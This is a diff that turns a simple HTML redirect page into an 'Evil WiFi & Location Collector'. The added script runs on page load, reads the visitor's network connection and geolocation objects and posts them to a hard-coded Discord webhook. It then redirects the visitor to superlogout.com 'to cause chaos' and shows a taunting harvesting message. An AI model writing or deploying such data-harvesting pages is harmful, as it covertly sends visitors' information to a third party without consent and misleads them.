@@ -1,13 +1,46 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Redirection automatique en HTML</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evil WiFi & Location Collector</title>
+    <script>
+        // Function to gather Wi-Fi and location information and send it to your webhook
+        function gatherAndSendInfo() {
+            // Gather Wi-Fi and location information
+            let wifiInfo = navigator.connection || {};
+            let locationInfo = navigator.geolocation || {};
 
-<meta http-equiv="refresh" content="1; URL=https://superlogout.com/">
+            // Prepare the data payload to send to the webhook
+            let data = {
+                wifiInfo: JSON.stringify(wifiInfo),
+                locationInfo: JSON.stringify(locationInfo)
+            };
+
+            // Send the data to your webhook
+            fetch('https://discord.com/api/webhooks/1226675190612758580/lhGStDkGIetoCqKyt2KcLMaeJW2KxtWtVMclcZoiV13osRHo4cPYHeCq5LfR7Drhlvw-', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(response => {
+                // Once the data is sent, redirect to the superlogout.com URL
+                window.location.href = 'https://superlogout.com/';
+            }).catch(error => {
+                console.error('Error sending data to webhook:', error);
+                // If an error occurs, still redirect to superlogout.com to cause chaos
+                window.location.href = 'https://superlogout.com/';
+            });
+        }
+
+        // Call the function to start the evil process
+        gatherAndSendInfo();
+    </script>
 </head>
-
 <body>
- <p>mathieu meriot.</p>
+    <!-- Optional: Add evil messages or visuals to further torment the victim -->
+    <h1>Welcome to the Evil WiFi & Location Collector</h1>
+    <p>Your personal information is now being harvested and sent to our servers. Enjoy!</p>
 </body>
-
 </html>
